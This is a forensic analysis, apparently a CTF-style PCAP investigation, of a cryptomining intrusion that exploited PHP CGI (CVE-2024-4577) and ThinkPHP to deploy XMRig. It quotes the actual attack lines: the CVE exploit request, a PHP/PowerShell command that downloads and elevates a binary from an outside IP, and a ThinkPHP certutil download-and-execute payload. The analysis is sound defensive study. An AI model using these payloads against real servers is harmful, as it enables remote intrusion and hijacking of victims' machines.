

###  Unauthorized Crypto-Mining on Public Servers

Over the past 24 hours, the IT department detected a drastic increase in CPU and memory usage across several publicly accessible servers. Initial investigation suggested unauthorized crypto-mining activity. A packet capture (PCAP) from one of the affected servers was provided for forensic analysis.

---

### 🔍 Analysis Overview

#### 🔹 **Step 1: Identifying Initial Access – PHP CGI Vulnerability**

A review of HTTP traffic in the PCAP revealed evidence of exploitation targeting the **PHP CGI vulnerability \[CVE-2024-4577]**:

* **CVE ID**: CVE-2024-4577
* **Published**: June 6, 2024
* **CVSS Score**: 9.8 (Critical)
* **Affected Software**: PHP in CGI mode (primarily on Windows systems)
* **Exploit Method**: Abuse of Unicode character misinterpretation, particularly the **0xAD** (`%AD`) character, which Windows misinterprets as `-`.

**Observed exploit request:**

```
POST /index.php?%ADd+allow_url_include=1+-d+auto_prepend_file=php://input HTTP/1.1
```

This indicates the attacker likely uploaded and executed malicious PHP payloads by bypassing restrictions using the malformed `%AD` character.

---

#### 🔹 **Step 2: Malicious File Upload & Execution**

After gaining access, the attacker uploaded scripts and executables:

* A **PowerShell script** (`1.txt`, later renamed to `1.ps1`) gathered **CPU and memory info**:

  ```
  Intel(R) Core(TM) i7-6700HQ
  ```

* Next, the attacker uploaded a binary `2.txt`, saved as `2.exe`, which turned out to be a **crypto-miner**:

  * [VirusTotal Behavior Report](https://www.virustotal.com/gui/file/01c9940b468ce2a58f2bc52f5c8b7d0310451c994d798879ff653d92fbaf8719/behavior)

* Execution command embedded in PHP:

  ```php
  <?php system('powershell -ExecutionPolicy Bypass -Command "& {Invoke-WebRequest -Uri http://1.80.23.4:8000/2.txt -OutFile C:\Windows\Temp\2.exe; Start-Process C:\Windows\Temp\2.exe -Verb RunAs}"'); ?>
  ```

  * The `-Verb RunAs` ensures **elevated execution privileges**.

---

#### 🔹 **Step 3: Lateral Movement via ThinkPHP**

Further review of traffic revealed exploitation attempts targeting **ThinkPHP**:

**Malicious payload:**

```
http://89.17.51.230/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe /c certutil -urlcache -split -f http://36.96.48.3:19490/spread.txt C:\ProgramData\spread.exe && C:\ProgramData\spread.exe
```

* **Downloaded file**: `C:\ProgramData\spread.exe`
* **Execution**: Immediately run after download using `cmd.exe`
* This executable is likely another instance of the cryptominer.

---

#### 🔹 **Step 4: Monitoring & Resource Utilization**

The attacker monitored system performance via plain-text communication over TCP, notably with IP:

* **Remote IP**: `218.244.58.70`
* **Port**: `9011`
* The traffic revealed:

  ```
  CPU(Stop)|0.02|6%|0.00|auto.c3pool.org:19999|NO
  ```

This confirms the attacker's intent to observe mining performance and system stability remotely.

---

#### 🔹 **Step 5: Miner Identification**

By inspecting binary strings (e.g., `strings RCEMiner.pcap | grep pool`), we found:
using grep -i XMRig is enough i tried it first but forget the -i 

```
-o stratum+tcp://auto.c3pool.org:19999 -u SN -p 1
-o stratum+tcp://auto.c3pool.org:19999 -u SB250 -p 1
```

Further inspection of traffic to port `19999` revealed:

```json
{
  "id":1,
  "jsonrpc":"2.0",
  "method":"login",
  "params":{
    "login":"SN",
    "pass":"1",
    "agent":"XMRig/5.5.0 (Windows NT 10.0; Win64; x64) libuv/1.31.0 msvc/2015",
    "algo":["rx/0","cn/1",...]
  }
}
```

**Key Confirmation:**

* **Miner**: XMRig
* **Version**: 5.5.0
* **Mining Pool**: `auto.c3pool.org:19999`
* **Algorithm**: RandomX / CryptoNight variants
* **OS**: Windows 10 x64


###  Conclusion

The attacker exploited a critical PHP CGI vulnerability (CVE-2024-4577) and ThinkPHP to upload and execute a Monero cryptocurrency miner (**XMRig v5.5.0**). Remote monitoring was established, and multiple binaries were deployed using PowerShell and PHP wrappers. The use of obfuscated parameters and Unicode abuse highlights the sophistication of this campaign.

